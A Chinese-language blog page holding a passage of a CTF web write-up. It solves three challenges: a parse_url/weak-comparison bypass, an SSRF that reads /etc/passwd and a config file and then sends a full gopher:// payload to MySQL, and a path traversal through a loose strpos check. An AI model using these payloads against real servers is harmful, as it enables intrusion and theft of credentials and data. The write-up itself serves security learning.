<!DOCTYPE html>












  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">












<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">






















<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">









<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '6.3.0',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="personal blog">
<meta name="keywords" content="ctf web IT">
<meta property="og:type" content="website">
<meta property="og:title" content="Image&#39;s blog">
<meta property="og:url" content="https://hexo.imagemlt.xyz/page/3/index.html">
<meta property="og:site_name" content="Image&#39;s blog">
<meta property="og:description" content="personal blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Image&#39;s blog">
<meta name="twitter:description" content="personal blog">






  <link rel="canonical" href="https://hexo.imagemlt.xyz/page/3/">



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>Image's blog &mdash; Welcome to Image's Blog</title>
  









  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
	<a href="https://github.com/imagemlt"><img style="position: absolute; top: 0; right: 0; border: 0;z-index:1" src="https://s3.amazonaws.com/github/ribbons/forkme_right_orange_ff7600.png" alt="Fork me on GitHub"></a>
  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Image's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
      
        <h1 class="site-subtitle" itemprop="description">Welcome to Image's Blog</h1>
      
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">
    <a href="/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
    <a href="/about/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
    <a href="/tags/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">
    <a href="/categories/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
    <a href="/archives/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-links">
    <a href="/links/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-link"></i> <br>Links</a>
  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/isitdtuctf-web-writeup/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/isitdtuctf-web-writeup/index.html" itemprop="url">
                  isitdtuctf web writeup
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-08-02 15:56:42" itemprop="dateCreated datePublished" datetime="2018-08-02T15:56:42+08:00">2018-08-02</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>首发于安全客 <a href="https://www.anquanke.com/post/id/153258">https://www.anquanke.com/post/id/153258</a></p>
</blockquote>
<p></p><p>28号的时候师傅们都在打real world ctf，看了一下real world ctf实在玩不动。。。于是就去玩了玩这个越南的ctf比赛的web部分的题目。整体而言这个比赛的web部分的题目偏中等难度，还是比较适合新手的一次练手，部分题目也有一定的新意。这里给出部分题目的writeup。</p><p></p>
<p></p><p> </p><p></p>
<p></p><h2 name="h2-0" id="h2-0">IZ</h2><p></p>
<p><blockquote><p><a href="http://35.185.178.212/">题目地址</a></p></blockquote></p>
<p></p><p>打开题目可以获得题目源码：</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> “config.php”;</span><br><span class="line">$number1 = rand(<span class="number">1</span>,<span class="number">100000000000000</span>);</span><br><span class="line">$number2 = rand(<span class="number">1</span>,<span class="number">100000000000</span>);</span><br><span class="line">$number3 = rand(<span class="number">1</span>,<span class="number">100000000</span>);</span><br><span class="line">$url = urldecode($_SERVER[‘REQUEST_URI’]);</span><br><span class="line">$url = parse_url($url, PHP_URL_QUERY);</span><br><span class="line"><span class="keyword">if</span> (preg_match(“/_/i”, $url))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(“…”);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (preg_match(“/<span class="number">0</span>/i”, $url))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(“…”);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (preg_match(“/w+/i”, $url))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(“…”);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($GET[‘‘]) &amp;&amp; !<span class="keyword">empty</span>($GET[‘‘]))</span><br><span class="line">&#123;</span><br><span class="line">$control = $GET[‘‘];</span><br><span class="line"><span class="keyword">if</span>(!in_array($control, <span class="keyword">array</span>(<span class="number">0</span>,$number1)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(“fail1”);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!in_array($control, <span class="keyword">array</span>(<span class="number">0</span>,$number2)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(“fail2”);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!in_array($control, <span class="keyword">array</span>(<span class="number">0</span>,$number3)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(“fail3”);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p></p>
<p></p><p>可以看到题目的逻辑主要是获取query_string后用parse_url处理，处理后的$url再进行过滤，可以看到这里的过滤非常严所以想要绕过过滤还是有一定难度的。<br><br>然而parse_url函数存在一个bug:<br><br>当url的格式为<code>http:/localhost///x.php?key=value</code>的方式可以使其返回<code>False</code><br><br>这样就可以成功绕过之后的三次preg_match的过滤.<br><br>绕过三次preg_match的过滤后程序又进行了三次in_array()判断，而三次in_array()的数组都存在0这样一个元素。而由php弱类型的特性，in_array()在判断时使用的是弱比较，当比较一个字符串和一个数字时默认会尝试把字符串转换为数字，如果字符串的第一个字符不是数字的话则该字符串会被转化成0.具体的转化规则可以参考<a href="http://php.net/manual/zh/language.operators.comparison.php">php.net中的描述</a>。<br><br>因此最终的payload为：</p><p></p>
<p><pre><code>///?_=a<br></code></pre></p>
<p></p><p>访问即可获取flag。</p><p></p>
<p></p><p> </p><p></p>
<p></p><h2 name="h2-1" id="h2-1">Friss</h2><p></p>
<p><blockquote><p><a href="http://35.190.142.60/">题目地址</a></p></blockquote></p>
<p></p><p>题目进去后是一个表单页面：<br><img class="aligncenter" title="curl1" alt="curl1" src="https://p0.ssl.qhimg.com/t0156be5a0c256cebbc.png"></p><p></p>
<p></p><p>可以判断这个题目应该是要考ssrf相关的东西。于是首先测试file协议看能不能读到文件，输入<code>file:///etc/passwd</code>，结果题目返回：</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> “config.php”;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[‘url’])&amp;&amp;!<span class="keyword">empty</span>($_POST[‘url’]))</span><br><span class="line">&#123;</span><br><span class="line">    $url = $_POST[‘url’];</span><br><span class="line">    $content_url = getUrlContent($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $content_url = “”;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[‘debug’]))</span><br><span class="line">&#123;</span><br><span class="line">    show_source(FILE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p></p>
<p></p><p><code>file://localhost/var/www/html/config.php</code></p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$hosts = “localhost”;</span><br><span class="line">$dbusername = “ssrf_user”;</span><br><span class="line">$dbpasswd = “”;</span><br><span class="line">$dbname = “ssrf”;</span><br><span class="line">$dbport = <span class="number">3306</span>;</span><br><span class="line"></span><br><span class="line">$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initdb</span><span class="params">($conn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$dbinit = “create table <span class="keyword">if</span> not exists flag(secret varchar(<span class="number">100</span>));”;</span><br><span class="line"><span class="keyword">if</span>(mysqli_query($conn,$dbinit)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$tmpurl = parse_url($url, PHP_URL_HOST);</span><br><span class="line"><span class="keyword">if</span>($tmpurl != “localhost” <span class="keyword">and</span> $tmpurl != “<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>”)</span><br><span class="line">&#123;</span><br><span class="line">var_dump($tmpurl);</span><br><span class="line"><span class="keyword">die</span>(“&lt;h1&gt;Only access to localhost&lt;/h1&gt;”);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $url;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUrlContent</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">$url = safe($url);</span><br><span class="line">$url = escapeshellarg($url);</span><br><span class="line">$pl = “curl “.$url;</span><br><span class="line"><span class="keyword">echo</span> $pl;</span><br><span class="line">$content = shell_exec($pl);</span><br><span class="line"><span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">initdb($conn);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p></p>
<p></p><p>可以看到在config.php中告诉我们flag在数据库中且给出了我们一个空密码的mysql账户。因此我们便可以联想到34c3ctf中的一道<a href="http://www.freebuf.com/articles/web/159342.html">使用gopher协议攻击mysql的题目</a>。</p><p></p>
<p></p><p>这里gopher协议的主要功能是可以直接发起socket连接获取数据，而且由于mysql这里给出的密码是空密码，因此可以通过gopher发起sql请求来获取数据。<br><br>因此我们可以在本地用mysql搭建同样的环境，使用mysql客户端进行一次连接并获取执行读取flag的操作，用wireshark抓包后将抓取到的数据urlencode之后构造成符合gopher结构的payload即可获取到最后的flag。<br><br>首先我们创建相同的用户和同样的表结构：<img class="aligncenter" title="database" alt="database" src="https://p3.ssl.qhimg.com/t013058e72ceef9e2ac.png">然后给该用户此数据库的权限后使用该用户登入，获取该数据库内的flag信息，同时使用wireshark抓取lo上的包:<br><img class="aligncenter" alt="" src="https://p2.ssl.qhimg.com/t015c3a4af5175d3803.png"><br><img class="aligncenter" alt="" src="https://p4.ssl.qhimg.com/t015505823f6c7c57ab.png">wireshark中我们设置只显示客户端发送的数据包，以原始数据的形式显示<br><img class="aligncenter" alt="" src="https://p3.ssl.qhimg.com/t011d0763eeb24df413.png">将数据复制下来转换成urlencode的形式，构造gopher的链接为：</p><p></p>
<p><pre><code>gopher://127.0.0.1:3306/_%A8%00%00%01%85%A6%FF%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00ssrf_user%00%00mysql_native_password%00f%03_os%05Linux%0C_client_name%08libmysql%04_pid%0519500%0F_client_version%065.7.22%09_platform%06x86_64%0Cprogram_name%05mysql%21%00%00%00%03select%20%40%40version_comment%20limit%201%12%00%00%00%03SELECT%20DATABASE%28%29%05%00%00%00%02ssrf%0F%00%00%00%03show%20databases%0C%00%00%00%03show%20tables%06%00%00%00%04flag%00%13%00%00%00%03select%20%2A%20from%20flag%01%00%00%00%01<br></code></pre></p>
<p></p><p>最后可以在回显中获取flag<br><img class="aligncenter" alt="" src="https://p5.ssl.qhimg.com/t019c4894b8888e1928.png"></p><p></p>
<p></p><p> </p><p></p>
<p></p><h2 name="h2-2" id="h2-2">NNService</h2><p></p>
<p><blockquote><p><a href="http://35.240.231.243/">题目地址</a></p></blockquote></p>
<p></p><p>先扫描查看是否存在源码泄露，发现存在robots.txt,提示存在源码bk/bk.zip,访问即可获取题目的源码。<br><br>这里我们主要分析题目最后导致getflag的两个点，在<code>index.controller.php</code>中,首先分析更改个人信息的位置上传头像的点:</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_FILES[‘avatar’] <span class="keyword">and</span> $_FILES[“avatar”][“error”] == <span class="number">0</span>)&#123;</span><br><span class="line">     <span class="keyword">if</span>((($_FILES[“avatar”][“type”] == “image/gif”) <span class="keyword">or</span> ($_FILES[“avatar”][“type”] == “image/jpeg”) <span class="keyword">or</span> ($_FILES[“avatar”][“type”] == “image/png”)) <span class="keyword">and</span> $_FILES[‘avatar’][‘size’]&lt;<span class="number">65535</span>)&#123;</span><br><span class="line">         $info=getimagesize($_FILES[‘avatar’][‘tmp_name’]);</span><br><span class="line">         <span class="keyword">if</span>(@is_array($info) <span class="keyword">and</span> array_key_exists(‘mime’,$info))&#123;</span><br><span class="line">             $type=explode(‘/‘,$info[‘mime’])[<span class="number">1</span>];</span><br><span class="line">             $filepath=<span class="keyword">$this</span>-&gt;user-&gt;getuser().”.”.$type;</span><br><span class="line">             $filename=”uploads/“.$filepath;</span><br><span class="line">             <span class="keyword">if</span>(is_uploaded_file($_FILES[‘avatar’][‘tmp_name’]))&#123;</span><br><span class="line">                 <span class="keyword">$this</span>-&gt;user-&gt;edit(“avatar”,<span class="keyword">array</span>($filepath,$type));</span><br><span class="line">                 <span class="keyword">if</span>(strpos($filepath,”..”) !== <span class="keyword">false</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">die</span>(“Hacker, cut please!”);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span> <span class="keyword">if</span>(move_uploaded_file($_FILES[‘avatar’][‘tmp_name’], $filename))&#123;</span><br><span class="line">                     quit_and_refresh(‘Upload success!’,’edit’);</span><br><span class="line">                 &#125;</span><br><span class="line">                 quit_and_refresh(‘Success!’,’edit’);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="comment">//TODO！report it！</span></span><br><span class="line">             quit(‘Only allow gif/jpeg/png files smaller than <span class="number">64</span>kb!’);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="comment">//TODO！report it！</span></span><br><span class="line">         quit(‘Only allow gif/jpeg/png files smaller than <span class="number">64</span>kb!’);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p></p>
<p></p><p>分析代码流程，首先判断图片的mime类型，然后使用getimagesize获取图片的信息，之后从getimagesize获取到的图片信息中获取图片的后缀名，之后可以看到<code>$filepath=$this-&gt;user-&gt;getuser().”.”.$type;</code>，将用户名与图片名称拼接为图片上传路径，后调用<code>$this-&gt;user-&gt;edit(“avatar”,array($filepath,$type));</code>,跟到<code>user.class.php</code>文件中可以发现这一步的操作实质是将文件名写入了数据库中。之后<strong>使用强等于</strong>判断文件名中是否含有<code>..</code>，如果含有<code>..</code>则终止整个流程，否则将移动上传的图片到upload文件夹下，命名为<code>用户名.文件类型</code>;<br><br>然后我们再分析export处的源码：</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">export</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $avatar=<span class="keyword">$this</span>-&gt;user-&gt;getavatar();</span><br><span class="line">        <span class="keyword">if</span>(substr($avatar,<span class="number">0</span>,<span class="number">5</span>)!==”data:”)&#123;</span><br><span class="line">            $fileavatar=substr(<span class="keyword">$this</span>-&gt;user-&gt;getavatar(),<span class="number">1</span>);</span><br><span class="line">            $avatar = “uploads/“.$fileavatar;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(file_exists($avatar) <span class="keyword">and</span> filesize($avatar)&amp;lt;<span class="number">65535</span> <span class="keyword">and</span> strpos($fileavatar,<span class="string">".."</span>)==<span class="keyword">false</span>)&#123;</span><br><span class="line">        $data=file_get_contents($avatar);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&amp;gt;user-&amp;gt;updateavatar($data)) quit(<span class="string">'Something error!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//TODO！report it！</span></span><br><span class="line">        $out=<span class="string">"Your avatar is invalid, so we reported it"</span>.<span class="string">"&amp;lt;/p&amp;gt;"</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">"templates/error.html"</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&amp;lt;br&amp;gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$article=<span class="keyword">$this</span>-&amp;gt;user-&amp;gt;getarticle();</span><br><span class="line">$data=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&amp;lt;count($article);$i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>($i!=count($article)<span class="number">-1</span>)&#123;</span><br><span class="line">        $data.=$article[$i][<span class="number">2</span>].<span class="string">"rn"</span>;</span><br><span class="line">        $data.=$article[$i][<span class="number">3</span>].<span class="string">"n"</span>;</span><br><span class="line">        $data.=<span class="string">"----------n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $data.=$article[$i][<span class="number">2</span>].<span class="string">"rn"</span>;</span><br><span class="line">        $data.=$article[$i][<span class="number">3</span>].<span class="string">"n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$data.=<span class="string">"==========n"</span>;</span><br><span class="line">$avatar=<span class="keyword">$this</span>-&amp;gt;user-&amp;gt;getavatar(<span class="number">1</span>);</span><br><span class="line">$data.=base64_encode($avatar[<span class="number">1</span>]).<span class="string">"n"</span>;</span><br><span class="line">$data.=$avatar[<span class="number">3</span>];</span><br><span class="line">header(<span class="string">"Content-type: application/octet-stream"</span>);</span><br><span class="line">header(<span class="string">"Content-Transfer-Encoding: binary"</span>);</span><br><span class="line">header(<span class="string">"Accept-Ranges: bytes"</span>);</span><br><span class="line">header(<span class="string">"Content-Length: "</span>.strlen($data));</span><br><span class="line">header(<span class="string">"Content-Disposition: attachment; filename="</span><span class="string">".$this-&amp;gt;user-&amp;gt;getuser()."</span><span class="string">""</span>);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p>
<p></p><p>可以看到export处的代码在进行导出时，首先调用<code>$avatar=$this-&gt;user-&gt;getavatar();</code>获取头像的信息，我们跟到<code>user.class.php</code>中可以发现这一步操作便是将我们之前写入数据库的文件名取出。然后这里的代码对文件进行判断，判断文件是否存在，文件大小是否小于65535，以及<strong>使用弱等于</strong>判断文件名中是否含有<code>..</code>。之后便获取文件内容并base64加密后拼接上之前的一些信息输出文件。<br><br>这里我们可以看到主要的漏洞点在于写入数据库的操作在判断文件名是否包含<code>..</code>之前，因此我们即使文件名中包含了<code>..</code>最后不合法的文件名也会被写入数据库。而在之后export处读取到文件名后使用的是弱等于判断：</p><p></p>
<p><pre><code class="lang-php">strpos($fileavatar,”..”)==false<br></code></pre></p>
<p></p><p>然而当我们构造类似<code>../flag.php</code>的字符串时，strpos返回<code>..</code>出现的位置0，而<code>0==false</code>成立。因此我们便可以成功实现目录穿越。<br><br>但是这里还有一点：我们的文件名的生成方式是<code>用户名.文件类型</code>,文件类型由getimagesize()函数获得，因此只能是图片文件的后缀名，那么怎样才能截断这个后缀名从而成功获取<code>flag.php</code>的源码？<br><br>这里我们查看之前下载到的源码中的sql文件:</p><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="keyword">users</span> (</span><br><span class="line">  <span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">32</span>) primary <span class="keyword">key</span> auto_increment,</span><br><span class="line">  username <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span>,</span><br><span class="line">  nickname <span class="built_in">varchar</span>(<span 